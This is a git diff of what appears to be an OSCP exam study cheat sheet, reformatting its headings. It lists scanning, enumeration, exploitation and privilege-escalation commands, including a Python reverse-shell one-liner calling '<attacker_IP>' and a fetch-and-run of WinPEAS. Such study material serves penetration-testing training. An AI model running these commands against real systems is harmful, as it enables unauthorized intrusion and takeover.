@@ -31,7 +31,8 @@ prepare report
 **oscp important commands and tools:**
 
 Information Gathering and Enumeration
-Nmap (Network Scanning)
+
+**Nmap (Network Scanning)**
 
 Basic Scan (to find open ports):
 bash
@@ -49,7 +50,9 @@ Scan specific ports:
 bash
 Copy code
 nmap -p <port_number> <target_IP>
-Netcat (nc) - Banner Grabbing & Reverse Shell
+
+
+**Netcat (nc) - Banner Grabbing & Reverse Shell**
 
 Basic port scan:
 bash
@@ -63,24 +66,32 @@ Connect to a service:
 bash
 Copy code
 nc <target_IP> <port>
-Gobuster / Dirb (Directory and File Enumeration)
+
+
+**Gobuster / Dirb (Directory and File Enumeration)**
 
 Gobuster (faster enumeration):
 bash
 Copy code
 gobuster dir -u http://<target_IP> -w /path/to/wordlist.txt
-Dirb (slower but effective):
+
+
+**Dirb (slower but effective):**
 bash
 Copy code
 dirb http://<target_IP> /path/to/wordlist.txt
-Nikto (Web Vulnerability Scanner)
+
+
+**Nikto (Web Vulnerability Scanner)**
 
 Basic scan to find vulnerabilities in a web server:
 bash
 Copy code
 nikto -h http://<target_IP>
-Exploitation
-Metasploit Framework
+
+--
+**Exploitation
+Metasploit Framework**
 
 Search for exploits:
 bash
@@ -94,9 +105,10 @@ set RHOST <target_IP>
 set LHOST <your_IP>
 exploit
 Metasploit should only be used sparingly in OSCP (e.g., one machine during the exam).
-Searchsploit (Exploit-DB)
 
-Search for public exploits:
+**Searchsploit (Exploit-DB)
+Search for public exploits:**
+
 bash
 Copy code
 searchsploit <service/software>
@@ -104,13 +116,15 @@ Copy exploit to current directory:
 bash
 Copy code
 searchsploit -m <exploit_id>
-Manual Exploitation:
 
-For the OSCP exam, you should rely on manual exploitation as much as possible:
+**Manual Exploitation:**
+
+For the OSCP exam, rely on manual exploitation as much as possible:
 Download exploit code from Exploit-DB.
 Modify the code if necessary (adjust IP addresses, ports, shell commands, etc.).
-Post Exploitation and Privilege Escalation
-LinPEAS (Linux Privilege Escalation Automation Script)
+
+**Post Exploitation and Privilege Escalation
+LinPEAS (Linux Privilege Escalation Automation Script)**
 
 Run LinPEAS to enumerate for potential privilege escalation vectors:
 bash
@@ -129,7 +143,9 @@ chmod +x LinEnum.sh
 GTFOBins (Linux Binary Exploits)
 
 If you find a vulnerable SUID binary or restricted shell, you can look it up on GTFOBins to see if it can be exploited for privilege escalation.
-Windows Privilege Escalation Tools:
+
+----
+**Windows Privilege Escalation Tools:**
 
 WinPEAS:
 
@@ -137,6 +153,8 @@ bash
 Copy code
 Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEASx64.exe
 ./winPEASx64.exe
+
+
 PowerUp (Windows Privilege Escalation via PowerShell):
 
 bash
@@ -154,14 +172,18 @@ Check sudo privileges:
 bash
 Copy code
 sudo -l
-Cron Jobs (for Linux Privilege Escalation)
+
+**Cron Jobs (for Linux Privilege Escalation)**
 
 Check for misconfigured or writable cron jobs:
 bash
 Copy code
 cat /etc/crontab
-File Transfers
-Python HTTP Server (for file transfer)
+
+
+-------------
+**File Transfers
+Python HTTP Server (for file transfer)**
 
 Host a Python server to transfer files:
 bash
@@ -194,13 +216,16 @@ bash
 Copy code
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_IP>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 Post Exploitation (Privilege Escalation Techniques)
-SUID Privilege Escalation:
+
+--
+**SUID Privilege Escalation:**
 
 If you find any SUID files with elevated privileges, you can exploit them to gain root access.
 bash
 Copy code
 find / -perm /4000 2>/dev/null
-Kernel Exploits:
+
+**Kernel Exploits:**
 
 Use searchsploit or the manual search to find kernel vulnerabilities that can lead to privilege escalation.
 Important OSCP Tips
